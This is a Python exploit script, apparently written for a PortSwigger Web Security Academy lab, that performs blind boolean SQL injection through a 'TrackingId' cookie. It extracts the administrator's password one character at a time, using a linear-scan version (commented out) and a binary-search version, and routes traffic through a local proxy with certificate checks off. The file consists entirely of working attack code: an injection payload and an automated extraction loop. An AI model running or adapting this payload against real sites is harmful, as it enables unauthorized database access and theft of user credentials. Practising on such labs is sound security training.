import math
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

# def sqli_password(url):
#     passwords = ""
#     for i in range(1,21):
#         for j in range(32,126):
#             payload = "' and (select ascii(substring(password, %s, 1)) from users where username = 'administrator') = '%s' -- " % (i, j)
#             payload_encoded = urllib.parse.quote(payload)
#             cookies = {"TrackingId": "rSI6y7wBAX4ff2JI" + payload_encoded, "sessions": "wq9VHDqt5tG5JqzmKnfdz8VIPti8pemL"}
#             r = requests.get(url, cookies = cookies, verify = False) 
#             if "Welcome" not in r.text:
#                 sys.stdout.write("\r" + passwords + chr(j))
#                 sys.stdout.flush 
#             else:
#                 passwords += chr(j)    
#                 sys.stdout.write("\r" + passwords)
#                 sys.stdout.flush
#                 break

def req(url, num, oper, pas):
    payload = "' and (select ascii(substring(password, %s, 1)) from users where username = 'administrator') %s '%s' -- " % (num, oper, pas)
    payload_encoded = urllib.parse.quote(payload)
    cookies = {"TrackingId": "zkQ9F3cbeIB77oE8" + payload_encoded, "sessions": "KqLk3FLOcN5prh8Sa1AJeT8iLHLZj43J"}
    return requests.get(url, cookies = cookies, verify = False) 

def sqli_password(url):
    passwords = ""
    for i in range(1,21):
        first = 32
        last = 126
        while first <= last:
            middle = math.floor(first + (last-first)/2)
            if "Welcome" in req(url, i, '=', middle).text:
                passwords += chr(middle)
                sys.stdout.write("\r" + passwords)
                sys.stdout.flush
                break
            elif "Welcome" in req(url, i, '>', middle).text:
                sys.stdout.write("\r" + passwords + chr(middle))
                sys.stdout.flush
                first = middle + 1
            else:
                sys.stdout.write("\r" + passwords + chr(middle))
                sys.stdout.flush
                last = middle - 1
                

def main(): 
    url = "https://0a100000046997d0c095780000f500bd.web-security-academy.net/filter?category=Gifts"
    print("(+)Retrieving Passwords...")
    sqli_password(url)        

if __name__ == "__main__":
    main()